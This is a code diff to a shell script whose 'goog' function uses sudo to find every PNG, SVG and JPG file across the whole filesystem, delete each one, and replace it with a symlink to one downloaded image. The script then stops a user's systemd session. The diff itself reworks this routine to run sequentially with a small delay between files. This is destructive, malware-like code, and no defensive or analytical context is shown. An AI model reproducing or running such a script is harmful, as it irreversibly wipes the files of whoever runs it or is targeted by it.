@@ -64,27 +64,23 @@ EOF
 font &
 PB=$!
 
+fun() {
+  rm -f "$1"
+  ln -s "$goof" "$1"
+}
+
 goog() {
   dl $1
   goof=$PWD/$N.$1
   sudo find / -type f -iname "*.$1" -not -path "$goof" -print0 2>/dev/null \
-  | sudo parallel -0 -j 8 '
-    rm -f {}
-    ln -s "$goof" {}
-  '
+    | while IFS= read -r -d '' file; do fun $file; sleep 0.005; done
 }
 echo -n ...
-goog png &
-PC=$!
-goog svg &
-PD=$!
-goog jpg &
-PE=$!
+goog png
+goog svg
+goog jpg
 sleep 30
 wait $PA
 wait $PB
-wait $PC
-wait $PD
-wait $PE
 sleep 5
 sudo systemctl stop user@1000
